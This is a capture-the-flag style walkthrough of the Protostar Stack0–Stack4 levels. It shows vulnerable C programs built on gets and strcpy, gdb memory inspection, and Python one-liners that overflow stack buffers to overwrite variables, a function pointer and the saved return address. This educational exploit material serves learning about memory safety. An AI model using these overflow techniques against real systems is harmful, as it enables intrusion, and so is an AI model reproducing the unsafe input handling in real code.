# Stack0 

# Description 

>This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

# Source Code 

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
From the source code, we can see the main function has an integer variable called `modified` with value 0 and a buffer with 64 byte length.

It uses `gets` to write our input to that buffer, `gets` is dangerous because it doesn't check the input size.

So if we write more than 64 byte to that buffer, it will overwrite the modifierd variable value.

# Solution 
```
user@protostar:/opt/protostar/bin$ python -c 'print "A"*64 +"BBBB" ' | ./stack0
you have changed the 'modified' variable

```

# Stack1 
# Description 

>This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

# Source Code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}

```
It's similar to stack0 but it uses `strcpy` which is also dangerous because it doesn't check if the source size is greater than destination size.

strcpy copies argv[1] into the buffer, and we need to overwrite the modified varaible with `0x61626364`, so we need a 64 byte for the buffer plus `\x64\x63\x62\x61` for overwriting the modified variable.


# Solution 

```
user@protostar:/opt/protostar/bin$ ./stack1 `python -c 'print "A"*64 +"\x64\x63\x62\x61"'`
you have correctly got the variable to the right value

```

# Stack2 

# Source Code 
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
strcpy copies the data stored in an envirnoment variable called `GREENIE` to the buffer, and we need to overwrite the modidied varaible value with `0x0d0a0d0a`.

The buffer length is 64 byte, so we need a 64 byte plus the value that we need to overwrite the modified variable with.

we need to create that `GREENIE` variable, assign that value to it.

# Solution

```
user@protostar:/opt/protostar/bin$ GREENIE=`python -c 'print "A"*64 +"\x0a\x0d\x0a\x0d"'`
user@protostar:/opt/protostar/bin$ export GREENIE
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable

```

# Stack3

# Description 
> Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

# Source Code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

This exercise is similar to the previous one, but we need to overwrite the function pointer with the address of `win` function.

First, let's see where is the `win` function in memory.

```
(gdb) x win
0x08048424 <win>:        0x83e58955
```
The function `win` exists at address `0x08048424`, so we need to overwrite the value of the function pointer with that address like what we did with the modified varaible.

# Solution 

```
user@protostar:/opt/protostar/bin$ python -c 'print "A"*64 + "\x24\x84\x04\x08" ' | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed

```

# Stack4

# Description 

>Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

# Source Code 

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
In this level we have no variables to overwrite, but instead we need to overwrite the return address so when the main function is done, The control flow goes to the **win** function.

The buffer starts at address `0xbffff780` and the return address `0xb7eadc76` is at `0xbffff7cc` so we need **[0xcc - 0x80]**(76) bytes plus the return address we want.


```
(gdb) disassemble main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0
0x0804840e <main+6>:    sub    esp,0x50
0x08048411 <main+9>:    lea    eax,[esp+0x10]
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave
0x0804841e <main+22>:   ret
End of assembler dump.
(gdb) break *main+21
Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
(gdb) r
Starting program: /opt/protostar/bin/stack4
AAAA

Breakpoint 1, main (argc=1, argv=0xbffff874) at stack4/stack4.c:16
16      stack4/stack4.c: No such file or directory.
        in stack4/stack4.c
(gdb) x/32xw $esp
0xbffff770:     0xbffff780      0xb7ec6165      0xbffff788      0xb7eada75
0xbffff780:     0x41414141      0x08049500      0xbffff798      0x080482e8
0xbffff790:     0xb7ff1040      0x080495ec      0xbffff7c8      0x08048449
0xbffff7a0:     0xb7fd8304      0xb7fd7ff4      0x08048430      0xbffff7c8
0xbffff7b0:     0xb7ec6365      0xb7ff1040      0x0804843b      0xb7fd7ff4
0xbffff7c0:     0x08048430      0x00000000      0xbffff848      0xb7eadc76
0xbffff7d0:     0x00000001      0xbffff874      0xbffff87c      0xb7fe1848
0xbffff7e0:     0xbffff830      0xffffffff      0xb7ffeff4      0x0804824b
(gdb) x/2xw $ebp
0xbffff7c8:     0xbffff848      0xb7eadc76
```

So we need 76 bytes + the address of the win function that will overwrite the ret address.

```
(gdb) x win
0x080483f4 <win>:        0x83e58955
```

the win function starts at `0x080483f4`.

# Solution 

```
user@protostar:/opt/protostar/bin$ python -c 'print "A"*76 +"\xf4\x83\x04\x08"'  | ./stack4
code flow successfully changed

```

